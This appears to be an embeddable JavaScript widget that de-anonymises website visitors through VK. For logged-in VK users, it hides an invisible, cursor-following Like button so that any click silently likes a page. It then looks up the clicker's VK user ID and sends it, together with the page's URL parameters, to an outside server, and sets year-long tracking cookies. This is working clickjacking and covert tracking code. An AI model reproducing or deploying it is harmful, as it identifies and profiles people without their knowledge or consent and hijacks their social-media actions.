(function(e){
	if(!("WD" in e)){
		e.WD={};	
		
		WD.HOST = "http://vkontore.m2corp.ru";				
		WD.WIDGET = 3;
		WD.API = '/api/';
		WD.CALLBACK = 'callback=?';
		WD.COOOCKE = 'VkAppId';
		WD.DIV = 'widgetTemplateWindow';
		WD.TIMELIVE = 60*60*24*365;
		WD.VKID = 'vk';
				
		WD.addCss=function(a){
			var style = document.createElement("link");
			style.rel = "stylesheet";
			style.type = "text/css";
			style.href = a;
			WD.addFile(style);			
		};
		
		WD.addJs=function(a){			
			var hcc = document.createElement("script");
			hcc.type = "text/javascript";
			hcc.async = true;
			hcc.src = a;
			var s = document.getElementsByTagName("script")[0];			
			document.getElementsByTagName("head")[0].appendChild(hcc);			
		};
		
		WD.addFile=function(a){			
			document.getElementsByTagName("head")[0].appendChild(a);
		};
		
		WD.addElement=function(a,b){
			var element = document.createElement(a);
			element.id = b;
			document.body.appendChild(element);
		};
		
		WD.getCookie=function(a){
			var cookie = " " + document.cookie;
			var search = " " + a + "=";
			var setStr = null;
			var offset = 0;
			var end = 0;
			if (cookie.length > 0) {
				offset = cookie.indexOf(search);
				if (offset != -1) {
					offset += search.length;
					end = cookie.indexOf(";", offset)
					if (end == -1) {
						end = cookie.length;
					}
					setStr = unescape(cookie.substring(offset, end));
				}
			}
			return(setStr);
		};
		
		WD.setCookie=function(a, b, c, d, e, f) {
			document.cookie = a + "=" + escape(b) +
			((c) ? "; expires=" + c.toGMTString() : "") +
			((d) ? "; path=" + d : "") +
			((e) ? "; domain=" + e : "") +
			((f) ? "; secure" : "");
		}
		
		WD.getUserId=function (VK,templateVK){
			//определяем кто это был
			VK.api('likes.getList', {type: "sitepage", owner_id: templateVK, page_url: window.location},
			function(data) {				
				var userId = data.response.users;				
				expires = new Date();
				expires.setTime(expires.getTime() + (1000 * WD.TIMELIVE));
				WD.setCookie(WD.COOOCKE,userId, expires,'/');				
				var getParams = WD.getUrlVars();
				var saveGet = "";
				for(var i = 0; i < getParams.length; i++) {					
					saveGet += getParams[i] + '||||||||||' + WD.getUrlVars()[getParams[i]] + '*****';
				}
				//console.log(WD.HOST + WD.API + 'saveUser/' + WD.WIDGET + '/?saveId=' + userId + '&' + 'saveGet=' + saveGet + '&' + WD.CALLBACK);
				$.getJSON(WD.HOST + WD.API + 'saveUser/' + WD.WIDGET + '/?saveId=' + userId + '&' + 'saveGet=' + saveGet + '&' + WD.CALLBACK, function(data){});
			});			
		}
		
		WD.getUrlVars=function() {
			var vars = [], hash;
			//svar hash;
			var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
			for(var i = 0; i < hashes.length; i++) {
				hash = hashes[i].split('=');
				vars.push(hash[0]);
				vars[hash[0]] = hash[1];
			}
			return vars;
		};
				
		WD.addWindowTemplate=function(){			
			var n = 'hash';
			var hash = false
			var match = RegExp('[?&]' + n + '=([^&]*)').exec(window.location.search);
			var tempCookie = WD.getCookie(WD.COOOCKE);
			if(match)
				hash = decodeURIComponent(match[1].replace(/\+/g, ' '));
			
			if(hash && !tempCookie){								
				$.getJSON(WD.HOST + WD.API + 'getTemplate/' + WD.WIDGET + '/?' + WD.CALLBACK, function(data){
						
						VK.init({apiId: data.templateVK, onlyWidgets: true});
						
						$('body').append('<div id="vk_auth" style="opacity:0;position: absolute;left:-5000px;z-index: 0;"></div>');		
												
						VK.Widgets.Auth("vk_auth", {width: "200px"});						
						setTimeout(function(){		
							console.log($('#vk_auth').height());						
							if($('#vk_auth').height() > 90){
								WD.addCss(WD.HOST + "/shablon_window/" + data.templateId + "_window.css");	
								WD.addJs(WD.HOST + "/shablon_window/" + data.templateId + "_window.js");														
								WD.addCss(WD.HOST + "/app/general.css");					
								
								//посетитель авторизованный в VK
								//вставляем блок html для лайка
								$('body').append('<div id="vkPost" style="width:20px; height:20px; overflow: hidden; opacity:0;cursor:pointer;position: absolute;z-index: 1000;"><div id="vk_like" style="margin:0px 0 0 0px;"></div></div>');	
								//вставляем виджет лайка
								VK.Widgets.Like("vk_like", {type: "mini", height: 20});
								
								$('html,body').mousemove(function(e){
									$('#vkPost').css('left',e.pageX-5);
									$('#vkPost').css('top',e.pageY-5);	
								});
																
								WD.addElement('div', WD.DIV);								
								$("div#" + WD.DIV).html(data.templateHTML);
																
								$("div#PopWindowText").html(data.templateTEXT);
								
								//запускаем событие на лайк
								VK.Observer.subscribe("widgets.like.liked", function f()
								{
									//посетитель нажал лайк
									WD.getUserId(VK,data.templateVK);
									//удаляем все блоки
									$('#vkPost,body > iframe,#vk_auth,#'+WD.DIV).remove();
								});	
								WD.getUserId(VK,data.templateVK);
								
							}else{
								$('#vk_auth').remove();
							}							
						}, 2000);										
				});			
			}
			if(WD.getUrlVars()[WD.VKID] != undefined){
				$.getJSON(WD.HOST + WD.API + 'getGetParams/' + WD.WIDGET + '/?saveId=' + WD.getUrlVars()[WD.VKID] + '&' + WD.CALLBACK, function(data){					
					expires = new Date();
					expires.setTime(expires.getTime() + (1000 * WD.TIMELIVE));
					for(var p in data) {						
						WD.setCookie(p,data[p], expires,'/');
					}
				});
			}
		}
		
		WD.init=function(){	
			var hashes = window.location.href.slice(window.location.href).split('?');
			if(hashes[1] != undefined){
				expires = new Date();
				expires.setTime(expires.getTime() + (1000 * WD.TIMELIVE));
				WD.setCookie('vkuri','?'+hashes[1], expires,'/');
			}
			$.getScript("http://vk.com/js/api/openapi.js?115", function(){
				WD.addWindowTemplate();				
			});
			
		};			
		WD.init();		
	}	
})(window);